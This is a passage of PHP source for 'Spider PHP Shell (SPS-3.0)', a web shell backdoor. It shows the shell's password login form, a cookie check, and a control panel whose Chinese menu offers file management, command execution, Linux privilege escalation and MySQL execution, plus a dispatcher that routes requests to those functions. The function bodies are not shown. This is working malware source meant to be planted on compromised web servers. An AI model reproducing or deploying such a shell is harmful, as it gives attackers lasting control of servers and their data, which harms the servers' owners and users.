		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="spiderpass" style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="LOGIN" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
</html>
END;
	return false;
}

function WinMain()
{
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
	$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
print<<<END
<html>
	<title> Spider PHP Shell (SPS-3.0) </title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px; text-align:center;margin-top:5px;word-break:break-all;}
			a{color:#FFFFFF;text-decoration:none;}
			a:hover{background:#BBBBBB;}
			.outtable {margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
			.topbg {padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
			.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
			.listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
			.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
			.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
		</style>
		<script language="JavaScript">
			function switchTab(tabid)
			{
				if(tabid == '') return false;
				for(var i=0;i<=8;i++)
				{
					if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
					else document.getElementById('t_'+i).style.background="#BBBBBB";
				}
				return true;
			}
		</script>
	</head>
	<body>
		<div class="outtable">
		<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
			<div style="height:546px;">
				<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
				<tr>
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main"> 文件管理 </a></li>
						<li><a href="?s=e" id="t_1" onclick="switchTab('t_1')" target="main"> 扫描木马 </a></li>
						<li><a href="?s=f" id="t_2" onclick="switchTab('t_2')" target="main"> 系统信息 </a></li>
						<li><a href="?s=g" id="t_3" onclick="switchTab('t_3')" target="main"> 执行命令 </a></li>
						<li><a href="?s=h" id="t_4" onclick="switchTab('t_4')" target="main"> 组件接口 </a></li>
						<li><a href="?s=j" id="t_5" onclick="switchTab('t_5')" target="main"> 搜索文件 </a></li>
						<li><a href="?s=k" id="t_6" onclick="switchTab('t_6')" target="main"> Linux提权 </a></li>
						<li><a href="?s=n" id="t_7" onclick="switchTab('t_7')" target="main"> MYSQL执行 </a></li>
						<li><a href="?s=logout" id="t_8" onclick="switchTab('t_8')"> 退出系统 </a></li>
					</ul>
				</td>
				<td>
				<iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe>
				</td>
				</tr>
				</table>
			</div>
		<div class="bottombg"> {$Server_Soft} </div>
		</div>
	</body>
</html>
END;
return false;
}

if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}
if($_GET['s'] == 'logout')
{
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}
if($_COOKIE['admin_spiderpass'] != md5($password))
{
	ob_start();
	$MSG_TOP = 'LOGIN';
	if(isset($_POST['spiderpass']))
	{
		$cookietime = time() + 24 * 3600;
		setcookie('admin_spiderpass',md5($_POST['spiderpass']),$cookietime);
		if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv="refresh" content="1;URL=?">');}
		else{$MSG_TOP = 'PASS IS FALSE';}
	}
	Root_Login($MSG_TOP);
	ob_end_flush();
	exit;
}

if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
$p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));

switch($s)
{
	case "a" : File_a($p); break;
	case "e" : Antivirus_e(); break;
	case "f" : Info_f(); break;
	case "g" : Exec_g(); break;
	case "h" : Com_h(); break;
	case "j" : Findfile_j(); break;
	case "k" : Linux_k(); break;
	case "n" : Mysql_n(); break;
	case "o" : Mysql_o(); break;
	case "p" : File_Edit($_GET['fp'],$_GET['fn']); break;
	case "q" : File_Soup($p); break;
	case "r" : Mysql_Msg(); break;
	default: WinMain(); break;
}
?>
